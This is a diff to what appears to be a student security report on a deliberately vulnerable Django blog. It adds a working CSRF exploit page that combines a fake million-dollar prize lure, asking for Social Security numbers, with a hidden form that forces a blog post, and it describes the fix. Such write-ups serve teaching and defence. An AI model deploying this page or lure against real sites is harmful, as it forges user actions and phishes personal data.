@@ -18,8 +18,26 @@ https://github.com/gustafla/cyberblog/blob/master/blog/views.py#L39
 Cross-site Request Forgery
 By marking the create_post view with the csrf_exempt decorator, Django does not
 require a CSRF protection cookie. This enables a malicious site to trick the
-user into writing a blog post on the cyberblog site. An example attack page is
-provided in the csrf_exploit directory in the repository.
+user into writing a blog post on the cyberblog site.
+Here's an example of what an exploit page could look like:
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>CONGRATULATIONS!</title>
+    <!-- A READY TO RUN VERSION OF THIS IS PROVIDED IN THE csrf_exploit DIRECTORY -->
+  </head>
+  <body>
+    <h1>CONGRATULATIONS YOU HAVE WON $ 1,000,000</h1>
+    <p>Just fill out the form below to claim your prize! Include your Full
+    Name, Address, Phone Number, Social Security Number and Email Address.</p>
+    <form method="GET" action="http://127.0.0.1:8000/blog/create/">
+      <input type="hidden" id="title" name="title" value="I GOT DOXED" /><br />
+      <textarea id="text" name="text" style="height: 200px; width: 400px"></textarea><br />
+      <input type="submit" value="Claim $1,000,000">
+    </form>
+  </body>
+</html>
 This flaw can be fixed by removing the csrf_exempt decorator and adding a
 csrf_token in the form in the post.html -template. Also, a good practice would
 be to only accept new posts to be posted with the POST-method.
